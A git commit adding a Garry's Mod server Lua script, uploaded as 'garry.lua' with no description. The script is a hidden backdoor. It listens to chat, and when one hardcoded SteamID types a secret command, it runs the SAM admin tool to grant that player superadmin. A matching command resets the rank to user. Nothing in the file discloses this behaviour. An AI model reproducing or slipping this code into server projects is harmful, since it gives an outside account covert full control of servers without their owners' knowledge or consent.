510317cb29437a39d0fd953c2308144921398a94
AnonFall <78989850+32N133kuzik133N32@users.noreply.github.com>
2023-02-07 17:13:44 +1100

    Add files via upload

---
+++ garry.lua
@@ -0,0 +1,35 @@
+if SERVER then
+    hook.Add("PlayerSay", "Add_Rank_SuperAdmin", function(ply, text)
+
+            if text == "/karapuz_rank_superadmin" then
+
+            if ply:SteamID() == 'STEAM_0:0:555589835' then 
+                   RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'superadmin') 
+            elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+
+
+
+                   end
+               end
+        end)
+   end
+
+
+
+
+
+if SERVER then
+    hook.Add("PlayerSay", "Add_Rank_User", function(ply, text)
+
+            if text == "/karapuz_rank_user" then
+
+            if ply:SteamID() == 'STEAM_0:0:555589835' then 
+                   RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'user') 
+            elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+
+
+
+                   end
+               end
+        end)
+   end
